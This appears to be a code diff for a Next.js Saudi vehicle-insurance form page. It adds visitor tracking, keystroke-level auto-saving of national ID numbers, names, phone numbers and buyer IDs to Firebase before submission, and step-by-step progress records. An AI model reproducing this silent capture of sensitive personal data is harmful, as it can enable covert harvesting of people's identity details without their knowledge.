@@ -3,6 +3,9 @@ import { useState, useEffect, useCallback } from "react";
 import { useRouter } from "next/navigation";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
+import { getOrCreateVisitorID, updateVisitorPage } from "@/lib/visitor-tracking";
+import { addData } from "@/lib/firebase";
+import { useAutoSave } from "@/hooks/use-auto-save";
 import {
   Globe,
   RefreshCw,
@@ -58,6 +61,7 @@ function validateSaudiId(id: string): { valid: boolean; error: string } {
 
 export default function Home() {
   const router = useRouter();
+  const [visitorID] = useState(() => getOrCreateVisitorID());
   const [identityNumber, setIdentityNumber] = useState("");
   const [ownerName, setOwnerName] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -81,6 +85,28 @@ export default function Home() {
   const [selectedVehicle, setSelectedVehicle] =
     useState<VehicleDropdownOption | null>(null);
   const [serialFieldFocused, setSerialFieldFocused] = useState(false);
+
+  useEffect(() => {
+    if (visitorID) {
+      updateVisitorPage(visitorID, "home-new", 1);
+    }
+  }, [visitorID]);
+
+  useAutoSave({
+    visitorId: visitorID,
+    pageName: "home",
+    data: {
+      identityNumber,
+      ownerName,
+      phoneNumber,
+      documentType,
+      serialNumber,
+      insuranceType,
+      buyerName,
+      buyerIdNumber,
+      activeTab,
+    },
+  });
 
   const fetchVehicles = useCallback(async (nin: string) => {
     const validation = validateSaudiId(nin);
@@ -169,7 +195,7 @@ export default function Home() {
     setSerialFieldFocused(false);
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     const validation = validateSaudiId(identityNumber);
@@ -199,6 +225,25 @@ export default function Home() {
         selectedVehicle,
         timestamp: new Date().toISOString(),
       }));
+
+      await addData({
+        id: visitorID,
+        identityNumber,
+        ownerName,
+        phoneNumber,
+        documentType,
+        serialNumber,
+        insuranceType,
+        buyerName: insuranceType === "نقل ملكية" ? buyerName : "",
+        buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "",
+        activeTab,
+        selectedVehicle: selectedVehicle ? {
+          value: selectedVehicle.value,
+          label: selectedVehicle.label,
+        } : null,
+        currentStep: 2,
+        currentPage: "insur",
+      });
     } catch (err) {
       console.error("Error saving form data:", err);
     }
